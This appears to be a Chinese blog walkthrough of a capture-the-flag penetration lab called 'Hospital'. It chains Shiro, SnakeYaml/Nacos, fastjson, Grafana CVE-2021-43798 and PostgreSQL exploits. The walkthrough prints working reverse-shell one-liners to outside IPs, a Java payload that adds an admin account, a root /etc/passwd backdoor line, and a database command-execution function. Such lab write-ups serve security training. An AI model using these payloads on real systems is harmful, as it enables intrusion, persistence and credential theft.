+server: port: 8080 servlet: context-path: /hello spring: application: name: db-config cloud: nacos: discovery: server-addr: 127.0.0.1:8848 config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: dev group: DEFAULT_GROUP data-id: db-config.yaml datasource: mysql: url: jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true username: root password: P@ssWord!!! redis: host: localhost port: 6379 management: endpoints: web: exposure: include: &#39;*&#39; 将恶意的 yaml-payload.jar 包上传至 web01 主机上，并开启一个 http 服务：
+root@web01:~# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 172.30.12.6 - - [29/Dec/2023 14:52:42] &#34;GET /yaml-payload.jar HTTP/1.1&#34; 200 - 下一个charonlight/NacosExploitGUI,让 nacos 服务器去从远程服务器加载恶意的 yaml-payload.jar 包：
+远程桌面登录 nacos 主机，查看 flag02：
+web3 fastjson 医院后台管理平台：http://172.30.12.236:8080/
+使用 burp 插件 amaz1ngday/fastjson-exp 直接注入内存马：
+Linux 双网卡主机：
+root@web03:~# ifconfig eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.30.12.236 netmask 255.255.0.0 broadcast 172.30.255.255 inet6 fe80::216:3eff:fe13:6b80 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:13:6b:80 txqueuelen 1000 (Ethernet) RX packets 148468 bytes 58106819 (58.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 117490 bytes 20492549 (20.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.30.54.179 netmask 255.255.255.0 broadcast 172.30.54.255 inet6 fe80::216:3eff:fe00:e608 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:00:e6:08 txqueuelen 1000 (Ethernet) RX packets 5221 bytes 2442441 (2.4 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4640 bytes 1419394 (1.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 2446 bytes 208088 (208.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2446 bytes 208088 (208.0 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 配置代理：
+靶机二：
+./linux_x64_agent -c 靶机一ip:8888 -s 123 本机：
+(node 0) &gt;&gt; listen [*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1 [*] Please input the [ip:]&lt;port&gt; : 8888 [*] Node is listening on 8888 (node 0) &gt;&gt; [*] New node come! Node id is 1 (node 0) &gt;&gt; back (admin) &gt;&gt; detail Node[0] -&gt; IP: 39.101.163.3:9999 Hostname: web01 User: hacker Node[1] -&gt; IP: 172.30.12.236:53536 Hostname: web03 User: root use 1 socks 6666 web4 Grafana 需要利用 CVE-2021-43798 漏洞获取到数据库文件（/var/lib/grafana/grafana.db）以及存在解密密钥的配置文件（/etc/grafana/grafana.ini），然后进行解密。
+使用 A-D-Team/grafanaExp 可以一键利用漏洞解密输出 data_souce 信息：
+root@web03:~# ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000 2023/12/29 17:41:34 Target vulnerable has plugin [alertlist] 2023/12/29 17:41:34 Got secret_key [SW2YcwTIb9zpOOhoPsMm] 2023/12/29 17:41:34 There is [0] records in db. 2023/12/29 17:41:34 type:[postgres] name:[PostgreSQL] url:[localhost:5432] user:[postgres] password[Postgres@123]database:[postgres] basic_auth_user:[] basic_auth_password:[] 2023/12/29 17:41:34 All Done, have nice day! 使用账号密码 postgres:Postgres@123 登录 PostgreSQL 数据库：
+root@kali-server:~# export PGPASSWORD=Postgres@123 root@kali-server:~# proxychains4 -q psql -h 172.30.54.12 -U postgres -W psql (16.1 (Debian 16.1-1), server 8.1.0) WARNING: psql major version 16, server major version 8.1. Some psql features might not work. Type &#34;help&#34; for help. postgres=# select version(); version --------------------------------------------------------------------------------------------------------- PostgreSQL 8.1.0 on x86_64-unknown-linux-gnu, compiled by GCC gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 (1 row) postgres=# SHOW is_superuser; is_superuser -------------- on (1 row) postgres=# select usename, passwd from pg_shadow; usename | passwd ----------&#43;------------------------------------- root | md5da974531914a7c2c56df745574a5bd3a postgres | md5dd27d33705155fd675e498384ad3d2ea (2 rows) postgres=# SELECT name,setting,source FROM pg_settings WHERE name = &#39;password_encryption&#39;; name | setting | source ---------------------&#43;---------&#43;--------- password_encryption | on | default (1 row) PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件：
+postgres=# CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;, &#39;system&#39; LANGUAGE &#39;c&#39; STRICT; postgres=# select system(&#39;curl 172.30.54.179&#39;); system -------- 0 (1 row) postgres=# select system(&#39;perl -e \&#39;use Socket;$i=&#34;172.30.54.179&#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};\&#39;&#39;); system -------- 512 (1 row) 这里还需要给postgresql的root用户进行修改密码的操作，为了方便后面提权
+ALTER USER root WITH PASSWORD &#39;123456&#39;; 我先在web3写了个ssh后门，然后通过nc监听：
+nc -lvp 2333 -s 172.30.54.179 Listening on web03 2333 Connection received on 172.30.54.12 56402 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; postgres@web04:/usr/local/pgsql/data$ sudo -l sudo -l Matching Defaults entries for postgres on web04: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 这里有坑，一：需要输入刚才的 root 的密码，二：需要把得到的shel升为交互式shell：
+python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34; 通过sudo -l 提权：https://gtfobins.github.io/gtfobins/psql/
+psql \? !/bin/sh " />
+<meta property="og:locale" content="en-us" /><meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+
+
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/index.css">
+<link href="/index.xml" rel="alternate" type="application/rss+xml" title="末流双非的救赎之道">
+</head>
+
+<body>
+  <nav class="headnav">
+  <a href="/" class="logo">w0s1np</a>
+  <ul id="menu">
+    
+    <li><a href="/blog/">归档</a></li>
+    
+    <li><a href="/tags/">标签</a></li>
+    
+    <li><a href="/search">搜索</a></li>
+    
+    <li><a href="/about/">关于</a></li>
+    
+    <li><a href="/index.xml" target="_blank">RSS</a></li>
+  </ul>
+</nav>
+  <section>
+    
+    <div class="body-title">春秋云镜 Hospital</div>
+
+    
+    <div class="post-meta">
+      <time> 2024-10-25</time>
+      
+
+      <span class="tag-node">
+        
+        标签：
+        
+        <a href="/tags/pentest">#Pentest</a>
+        
+        
+      </span>
+
+    </div>
+    
+
+    
+    <div class="toc">
+      <nav id="TableOfContents">
+  <ol>
+    <li><a href="#web1-spring-boot-heapdump--shiro-deserialization">web1 <strong>Spring Boot Heapdump + Shiro Deserialization</strong></a>
+      <ol>
+        <li><a href="#web2-nacos-client-yaml-deserialization">web2 Nacos Client Yaml Deserialization</a></li>
+        <li><a href="#web3-fastjson">web3 fastjson</a></li>
+        <li><a href="#web4-grafana">web4 <strong>Grafana</strong></a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+    </div>
+    
+
+    <article class="post-content">
+      
+      <p>在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251514767.png" alt="image.png"></p>
+<h1 id="web1-spring-boot-heapdump--shiro-deserialization">web1 <strong>Spring Boot Heapdump + Shiro Deserialization</strong></h1>
+<p>fscan</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./fscan -h 39.101.142.149
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251514384.png" alt="image.png"></p>
+<p>开放了8080端口，是一个shiro框架，并且有heapdump泄漏</p>
+<p>访问<code>/actuator</code></p>
+<p>用工具分析一下 heapdump 文件，使用 <a href="https://github.com/whwlsfb/JDumpSpider">whwlsfb/JDumpSpider</a> 分析 heapdump 文件，将自动查找 <code>/actuator/env</code> 中的 <code>*</code> 内容进行显示</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515337.png" alt="image.png"></p>
+<p>拿到密钥用 shiro 的工具爆破一下利用链</p>
+<p>jdk_1.8_202</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515882.png" alt="image.png"></p>
+<p>打个 behinder，看看有没有 suid 提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/home/app/ &gt;whoami
+</span></span><span class="line"><span class="cl">app
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/home/app/ &gt;find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/vim.basic
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/staprun
+</span></span><span class="line"><span class="cl">/usr/bin/at
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/stapbpf
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
+</span></span></code></pre></div><p>vim.basic 拥有 suid 权限，这个就相当于我们可以以 root 的身份编辑文件了，可以尝试写 ssh 的 authorized_keys，反弹shell：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;47.110.124.239&#34;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">继续升级到交互式shell
+</span></span><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><p>写入 ssh 或者新增用户</p>
+<pre tabindex="0"><code>ssh-keygen -t rsa -f ~/.ssh/sshdoor    # 生成公私钥
+
+vim.basic /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+
+ssh -i sshdoor root@172.30.12.236    # ～/.ssh
+</code></pre><p><code>:1,$d</code>清除所有内容，<code>:i</code>进入编辑模式，写入后<code>wq!</code>强制保存</p>
+<p>或者写系统账号密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">生成密码：用 openssl passwd -1 -salt <span class="m">123</span> 123456（这里是-1（数字1）不是L）
+</span></span><span class="line"><span class="cl"><span class="nv">$1$123$7</span>mft0jKnzzvAdU4t0unTG1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">直接写在passwd文件里面
+</span></span><span class="line"><span class="cl">vim.basic /etc/passwd
+</span></span><span class="line"><span class="cl">hacker:<span class="nv">$1$123$7</span>mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">su hacker <span class="c1"># 密码123456</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">hacker
+</span></span><span class="line"><span class="cl"><span class="c1"># ls /root/flag</span>
+</span></span><span class="line"><span class="cl">ls /root/flag
+</span></span><span class="line"><span class="cl">flag01.txt
+</span></span></code></pre></div><h2 id="web2-nacos-client-yaml-deserialization">web2 Nacos Client Yaml Deserialization</h2>
+<p>上传 fscan</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">172.30.12.6:8848 open
+</span></span><span class="line"><span class="cl">172.30.12.236:22 open
+</span></span><span class="line"><span class="cl">172.30.12.5:22 open
+</span></span><span class="line"><span class="cl">172.30.12.236:8080 open
+</span></span><span class="line"><span class="cl">172.30.12.5:8080 open
+</span></span><span class="line"><span class="cl">172.30.12.6:445 open
+</span></span><span class="line"><span class="cl">172.30.12.6:139 open
+</span></span><span class="line"><span class="cl">172.30.12.6:135 open
+</span></span><span class="line"><span class="cl">172.30.12.236:8009 open
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">9</span>
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.30.12.6
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>Server02
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.30.12.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.30.12.6     WORKGROUP<span class="se">\S</span>ERVER02            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>6C4FB4BD34B554A1F4A994A901D7A329
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.30.12.5:8080/login<span class="p">;</span><span class="nv">jsessionid</span><span class="o">=</span>6C4FB4BD34B554A1F4A994A901D7A329 code:200 len:2005   title:医疗管理后台
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status <span class="m">404</span> – Not Found
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 
+</span></span></code></pre></div><p>内网的<code>172.30.12.6:8848</code>是 Nacos，发现一个 nacos 并且存在未授权添加用户的漏洞。，配置代理后访问</p>
+<p>靶机一：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">linux_x64_agent</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">9999</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">123</span><span class="w">
+</span></span></span></code></pre></div><p>本机：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">mac_admin</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">靶机一ip</span><span class="p">:</span><span class="n">9999</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">123</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">socks</span><span class="w"> </span><span class="n">7777</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515492.png" alt="image.png"></p>
+<p>可以打<code>SnakeYaml</code>，编译恶意 payload，参考项目：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p>只需要修改 AwesomeScriptEngineFactory.java 的内容，由于目标是 windows 机器，所以可以添加个帐号，目标服务器也开了 3389 端口</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">AwesomeScriptEngineFactory</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;net user h0ny Admin123AKB48 /add&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;net localgroup administrators h0ny /add&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>然后用<strong>java1.8 的版本</strong>去编译，这里用的jdk1.8_202</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">javac</span><span class="w"> </span><span class="n">src</span><span class="o">/</span><span class="n">artsploit</span><span class="o">/</span><span class="n">AwesomeScriptEngineFactory</span><span class="p">.</span><span class="na">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jar</span><span class="w"> </span><span class="o">-</span><span class="n">cvf</span><span class="w"> </span><span class="n">yaml</span><span class="o">-</span><span class="n">payload</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="n">src</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span></code></pre></div><p>访问 nacos 应用[<code>http://172.30.12.6:8848](http://172.30.12.6:8848/)/nacos/</code>,读配置文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">server</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">port</span><span class="p">:</span><span class="w"> </span><span class="n">8080</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">servlet</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">context</span><span class="o">-</span><span class="n">path</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">hello</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">spring</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">application</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">db</span><span class="o">-</span><span class="n">config</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">cloud</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">nacos</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">discovery</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">server</span><span class="o">-</span><span class="n">addr</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="p">:</span><span class="n">8848</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">config</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">server</span><span class="o">-</span><span class="n">addr</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="p">:</span><span class="n">8848</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">file</span><span class="o">-</span><span class="n">extension</span><span class="p">:</span><span class="w"> </span><span class="n">yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">namespace</span><span class="p">:</span><span class="w"> </span><span class="n">dev</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">group</span><span class="p">:</span><span class="w"> </span><span class="n">DEFAULT_GROUP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">data</span><span class="o">-</span><span class="n">id</span><span class="p">:</span><span class="w"> </span><span class="n">db</span><span class="o">-</span><span class="n">config</span><span class="p">.</span><span class="na">yaml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">datasource</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">mysql</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">url</span><span class="p">:</span><span class="w"> </span><span class="n">jdbc</span><span class="p">:</span><span class="n">mysql</span><span class="p">:</span><span class="c1">//localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="n">root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">password</span><span class="p">:</span><span class="w"> </span><span class="n">P</span><span class="nd">@ssWord</span><span class="o">!!!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">redis</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">host</span><span class="p">:</span><span class="w"> </span><span class="n">localhost</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">port</span><span class="p">:</span><span class="w"> </span><span class="n">6379</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">management</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">endpoints</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">web</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">exposure</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">include</span><span class="p">:</span><span class="w"> </span><span class="sc">&#39;*&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>将恶意的 <code>yaml-payload.jar</code> 包上传至 web01 主机上，并开启一个 http 服务：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">root</span><span class="nd">@web01</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">server</span><span class="w"> </span><span class="n">80</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Serving</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="nf">80</span><span class="w"> </span><span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="c1">//0.0.0.0:80/) ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">12</span><span class="p">.</span><span class="na">6</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">[</span><span class="n">29</span><span class="o">/</span><span class="n">Dec</span><span class="o">/</span><span class="n">2023</span><span class="w"> </span><span class="n">14</span><span class="p">:</span><span class="n">52</span><span class="p">:</span><span class="n">42</span><span class="o">]</span><span class="w"> </span><span class="s">&#34;GET /yaml-payload.jar HTTP/1.1&#34;</span><span class="w"> </span><span class="n">200</span><span class="w"> </span><span class="o">-</span><span class="w">
+</span></span></span></code></pre></div><p>下一个<a href="https://github.com/charonlight/NacosExploitGUI">charonlight/NacosExploitGUI</a>,让 nacos 服务器去从远程服务器加载恶意的 <code>yaml-payload.jar</code> 包：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515656.png" alt="image.png"></p>
+<p>远程桌面登录 nacos 主机，查看 flag02：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515561.png" alt="image.png"></p>
+<h2 id="web3-fastjson">web3 fastjson</h2>
+<p>医院后台管理平台：<a href="http://172.30.12.236:8080/">http://172.30.12.236:8080/</a></p>
+<p>使用 burp 插件 <a href="https://github.com/amaz1ngday/fastjson-exp">amaz1ngday/fastjson-exp</a> 直接注入内存马：</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515388.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515993.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410251515087.png" alt="image.png"></p>
+<p>Linux 双网卡主机：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">root</span><span class="nd">@web03</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ifconfig</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">eth0</span><span class="p">:</span><span class="w"> </span><span class="n">flags</span><span class="o">=</span><span class="n">4163</span><span class="o">&lt;</span><span class="n">UP</span><span class="p">,</span><span class="n">BROADCAST</span><span class="p">,</span><span class="n">RUNNING</span><span class="p">,</span><span class="n">MULTICAST</span><span class="o">&gt;</span><span class="w">  </span><span class="n">mtu</span><span class="w"> </span><span class="n">1500</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inet</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">12</span><span class="p">.</span><span class="na">236</span><span class="w">  </span><span class="n">netmask</span><span class="w"> </span><span class="n">255</span><span class="p">.</span><span class="na">255</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w">  </span><span class="n">broadcast</span><span class="w"> </span><span class="n">172</span><span class="p">.</span><span class="na">30</span><span class="p">.</span><span class="na">255</span><span class="p">.</span><span class="na">255</span><span class="w">
